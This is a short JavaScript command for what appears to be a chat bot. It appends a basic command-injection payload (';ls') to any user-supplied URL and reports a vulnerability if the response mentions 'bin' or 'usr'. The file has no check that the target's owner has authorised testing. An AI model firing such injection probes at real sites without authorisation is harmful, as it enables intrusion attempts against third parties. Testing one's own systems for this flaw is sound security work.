const { sendMessage } = require('../handles/sendMessage');
const axios = require('axios');

module.exports = {
   name: 'cmdinject',
   description: 'Test for Command Injection vulnerabilities',
   usage: 'cmdinject <url>',
   author: 'Mota - Dev',

   async execute(senderId, args, token) {
      const url = args[0];
      if (!url) {
         return sendMessage(senderId, { text: "Please provide a URL to test for Command Injection (e.g., https://example.com?cmd=)." }, token);
      }

      const payload = ";ls"; // Basic Command Injection payload
      const testUrl = `${url}${encodeURIComponent(payload)}`;
      try {
         const response = await axios.get(testUrl);
         if (response.data.includes("bin") || response.data.includes("usr")) {
            return sendMessage(senderId, { text: `Command Injection Vulnerability Detected! Payload: ${testUrl}` }, token);
         } else {
            return sendMessage(senderId, { text: "No Command Injection vulnerability detected." }, token);
         }
      } catch (error) {
         console.error("Error during Command Injection test:", error);
         return sendMessage(senderId, { text: "Failed to test for Command Injection. Please try again later." }, token);
      }
   }
};
